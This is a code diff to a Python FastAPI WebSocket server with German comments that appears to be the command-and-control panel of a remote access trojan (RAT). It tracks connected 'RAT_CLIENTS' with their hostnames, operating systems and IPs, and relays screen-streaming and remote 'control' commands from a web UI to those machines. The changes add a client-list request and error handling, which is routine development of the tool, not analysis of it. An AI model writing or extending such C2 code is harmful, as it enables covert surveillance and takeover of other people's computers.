@@ -76,6 +76,11 @@ async def websocket_endpoint(websocket: WebSocket):
                 await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Web-UI Fehler: {e}"})
                 break
 
+            # --- Client-Liste explizit anfordern ---
+            if data.get("action") == "get_clients":
+                await send_client_list()
+                continue
+
             # --- Screenstream/Control Weiterleitung ---
             if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control'):
                 target = data.get('target_id') or data.get('client_id')
@@ -86,7 +91,7 @@ async def websocket_endpoint(websocket: WebSocket):
                     continue
                 if target_int in RAT_CLIENTS:
                     payload = dict(data)
-                    payload["client_id"] = str(target_int)  # explizit als String für Frontend
+                    payload["client_id"] = str(target_int)
                     await RAT_CLIENTS[target_int].send_json(payload)
                     await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Screenstream/Control an Client {target_int} weitergeleitet."})
                 else:
@@ -148,21 +153,24 @@ async def websocket_endpoint(websocket: WebSocket):
 
 # --- Hilfsfunktion: Sende aktuelle Client-Liste ---
 async def send_client_list():
-    await send_to_web_ui(
-        {
-            "type": "client_list",
-            "clients": [
-                {
-                    "id": str(cid),
-                    "hostname": CLIENT_INFOS.get(cid, {}).get("hostname", f"Client {cid}"),
-                    "address": getattr(ws, 'remote_address', 'unknown'),
-                    "os": CLIENT_INFOS.get(cid, {}).get("os", ""),
-                    "ip": CLIENT_INFOS.get(cid, {}).get("ip", ""),
-                }
-                for cid, ws in RAT_CLIENTS.items()
-            ],
-        }
-    )
+    try:
+        await send_to_web_ui(
+            {
+                "type": "client_list",
+                "clients": [
+                    {
+                        "id": str(cid),
+                        "hostname": CLIENT_INFOS.get(cid, {}).get("hostname", f"Client {cid}"),
+                        "address": getattr(ws, 'remote_address', 'unknown'),
+                        "os": CLIENT_INFOS.get(cid, {}).get("os", ""),
+                        "ip": CLIENT_INFOS.get(cid, {}).get("ip", ""),
+                    }
+                    for cid, ws in RAT_CLIENTS.items()
+                ],
+            }
+        )
+    except Exception as e:
+        logging.error(f"Fehler beim Senden der Client-Liste: {e}")
 
 # --- RAT-Client WebSocket Endpunkt ---
 @app.websocket("/rat")
